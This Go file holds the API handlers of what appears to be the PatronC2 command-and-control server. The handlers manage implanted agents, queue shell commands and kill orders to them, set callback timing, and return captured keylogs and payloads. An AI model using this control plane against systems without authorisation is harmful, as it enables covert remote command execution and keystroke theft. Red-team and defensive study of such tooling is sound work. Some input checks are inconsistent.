package api

import (
	"fmt"
	"net/http"
	"regexp"

	"github.com/PatronC2/Patron/data"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func GetAgentsHandler(c *gin.Context) {
	// Get all agents
	agents, err := data.Agents()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"data": agents})
}

func GetGroupAgentsByIP(c *gin.Context) {
	// Get agents by IP
	ip := c.Param("ip")
	agents, err := data.AgentsByIp(ip)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agents"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"data": agents})
}

func GetOneAgentByUUID(c *gin.Context) {
	// Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
	agents, err := data.FetchOneAgent(uuid)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
		return
	}
	tags, err := data.GetAgentTags(uuid)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"data": agents, "tags": tags})
}

func GetAgentCommandsByUUID(c *gin.Context) {
	// Get agents by UUID
	uuid := c.Param("agt")
	fmt.Println("Trying to find agent", uuid)
	agents, err := data.GetAgentCommands(uuid)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get agent"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"data": agents})
}

func UpdateAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")

	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}

	vsvrIP := regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`)
	vsvrPort := regexp.MustCompile(`^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`)
	vfrequency := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackfrequency := vfrequency.MatchString(body["callbackfreq"])
	vjitter := regexp.MustCompile(`^\d{1,5}$`)
	vcallbackjitter := vjitter.MatchString(body["callbackjitter"])

	if !vsvrIP.MatchString(body["serverip"]) {
		fmt.Println("Invalid server IP address")
		return
	} else if !vsvrPort.MatchString(body["serverport"]) {
		fmt.Println("Invalid server port")
		return
	} else if !vcallbackfrequency {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Frequency, Max 99999"})
	} else if !vcallbackjitter {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid Callback Jitter, Max 100"})
	} else {
		data.UpdateAgentConfig(agentParam, body["serverip"], body["serverport"], body["callbackfreq"], body["callbackjitter"])
		c.JSON(http.StatusOK, gin.H{"message": "Success"})
	}
}

func SendCommandHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()

	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}

	command := body["command"]
	data.SendAgentCommand(agentParam, "0", "shell", command, newCmdID)
	c.JSON(http.StatusOK, gin.H{"message": "Success"})
}

func KillAgentHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	newCmdID := uuid.New().String()
	data.SendAgentCommand(agentParam, "0", "kill", "Kill Agent", newCmdID)
	c.JSON(http.StatusOK, gin.H{"message": "Success"})
}

func GetKeylogHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	keylogs := data.Keylog(agentParam)
	c.JSON(http.StatusOK, gin.H{"data": keylogs})
}

func GetPayloadsHandler(c *gin.Context) {
	payloads := data.Payloads()
	c.JSON(http.StatusOK, gin.H{"data": payloads})
}

func GetNoteHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	notes, err := data.GetAgentNotes(agentParam)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error", "details": err.Error()})
	} else {
		c.JSON(http.StatusOK, gin.H{"data": notes})
	}
}

func PutNoteHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	var body map[string]string
	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}
	notes := body["notes"]
	err := data.PutAgentNotes(agentParam, notes)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error"})
	} else {
		c.JSON(http.StatusOK, gin.H{"message": "Success"})
	}
}

func GetTagsHandler(c *gin.Context) {
	agentParam := c.Param("agt")
	tags, err := data.GetAgentTags(agentParam)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error"})
	} else {
		c.JSON(http.StatusOK, gin.H{"tags": tags})
	}
}

func PutTagsHandler(c *gin.Context) {
	var body struct {
		AgentUUIDs []string `json:"agents"`
		Key        string   `json:"key"`
		Value      string   `json:"value,omitempty"`
	}

	if err := c.BindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
		return
	}

	if body.Value == "" {
		body.Value = ""
	}

	for _, agentUUID := range body.AgentUUIDs {
		err := data.PutAgentTags(agentUUID, body.Key, body.Value)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update tag for agent " + agentUUID})
			return
		}
	}

	c.JSON(http.StatusOK, gin.H{"message": "Tags updated successfully for all agents"})
}

func DeleteTagHandler(c *gin.Context) {
	tagid := c.Param("tagid")
	err := data.DeleteTag(tagid)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Internal Server Error"})
	} else {
		c.JSON(http.StatusOK, gin.H{"message": "deleted tag successfully"})
	}
}
